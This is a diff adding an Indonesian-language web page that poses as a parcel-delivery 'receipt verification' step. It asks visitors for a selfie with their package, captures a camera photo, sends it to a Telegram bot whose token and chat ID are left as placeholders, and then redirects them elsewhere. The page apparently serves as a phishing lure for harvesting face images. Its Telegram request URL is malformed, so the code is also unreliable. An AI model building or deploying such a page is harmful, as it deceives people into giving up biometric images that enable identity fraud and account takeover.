@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pelacakan Paket - Pindai Resi</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        .btn-action {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+        }
+        .btn-action:hover {
+            background-color: #0056b3;
+        }
+        video {
+            width: 100%;
+            margin-top: 20px;
+            display: none;
+            border-radius: 5px;
+            transform: scaleX(-1); /* Balik cermin jika menggunakan kamera depan */
+        }
+        #status {
+            margin-top: 15px;
+            color: #555;
+            font-size: 14px;
+        }
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Konfirmasi Penerimaan</h2>
+    <p>Silakan ambil foto selfie bersama paket Anda untuk memverifikasi resi pengiriman.</p>
+    
+    <button class="btn-action" id="startBtn">Mulai Verifikasi Kamera</button>
+    <button class="btn-action" id="captureBtn" style="display: none;">Ambil Foto & Kirim</button>
+    
+    <video id="preview" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    
+    <div id="status"></div>
+</div>
+
+<script>
+    // ================= CONFIGURATION =================
+    const TELEGRAM_BOT_TOKEN = 'ISI_TOKEN_BOT_TELEGRAM_ANDA_DI_SINI';
+    const TELEGRAM_CHAT_ID = 'ISI_CHAT_ID_TELEGRAM_ANDA_DI_SINI';
+    const TARGET_REDIRECT_URL = 'https://website-utama-anda.com'; // Alamat web tujuan setelah sukses
+    // =================================================
+
+    const startBtn = document.getElementById('startBtn');
+    const captureBtn = document.getElementById('captureBtn');
+    const video = document.getElementById('preview');
+    const canvas = document.getElementById('canvas');
+    const statusDiv = document.getElementById('status');
+
+    // 1. Membuka kamera ketika tombol ditekan
+    startBtn.addEventListener('click', async () => {
+        statusDiv.innerText = "Meminta akses kamera...";
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' }, // Menggunakan kamera depan
+                audio: false 
+            });
+            video.srcObject = stream;
+            video.style.display = 'block';
+            startBtn.style.display = 'none';
+            captureBtn.style.display = 'block'; // Tampilkan tombol untuk mengambil foto
+            statusDiv.innerText = "Kamera aktif. Silakan posisikan wajah dan paket Anda.";
+        } catch (err) {
+            statusDiv.innerText = "Gagal mengakses kamera. Pastikan izin telah diberikan.";
+            console.error(err);
+        }
+    });
+
+    // 2. Mengambil foto dan mengirimkannya ke Telegram
+    captureBtn.addEventListener('click', () => {
+        statusDiv.innerText = "Memproses dan mengirim foto...";
+        captureBtn.disabled = true;
+
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        // Gambar frame dari video ke canvas
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Ubah gambar menjadi Blob JPEG
+        canvas.toBlob(async (blob) => {
+            if (!blob) {
+                statusDiv.innerText = "Gagal mengambil gambar.";
+                captureBtn.disabled = false;
+                return;
+            }
+
+            // Siapkan data untuk dikirim ke API Telegram
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, 'verifikasi_resi.jpg');
+            formData.append('caption', 'Foto verifikasi penerimaan paket baru.');
+
+            try {
+                const response = await fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    statusDiv.innerText = "Verifikasi sukses! Mengalihkan halaman...";
+                    
+                    // Matikan kamera sebelum pindah halaman
+                    const tracks = video.srcObject.getTracks();
+                    tracks.forEach(track => track.stop());
+
+                    // Alihkan pengguna ke URL tujuan setelah jeda 1.5 detik
+                    setTimeout(() => {
+                        window.location.href = TARGET_REDIRECT_URL;
+                    }, 1500);
+                } else {
+                    statusDiv.innerText = "Gagal mengirim data ke server Telegram.";
+                    captureBtn.disabled = false;
+                }
+            } catch (error) {
+                statusDiv.innerText = "Terjadi kesalahan jaringan.";
+                captureBtn.disabled = false;
+                console.error(error);
+            }
+        }, 'image/jpeg', 0.9);
+    });
+</script>
+
+</body>
+</html>
